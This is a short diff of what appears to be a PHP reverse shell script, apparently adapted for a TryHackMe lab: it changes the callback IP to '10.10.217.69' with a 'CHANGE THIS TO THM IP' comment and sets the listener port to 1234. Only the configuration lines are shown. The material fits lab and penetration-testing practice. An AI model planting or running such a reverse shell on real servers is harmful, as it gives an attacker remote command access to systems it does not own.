@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.8.97.41';  // CHANGE THIS
+$ip = '10.10.217.69';  // CHANGE THIS TO THM IP
 $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
@@ -187,6 +187,4 @@ function printit ($string) {
 }
 
 ?> 
-
-
 
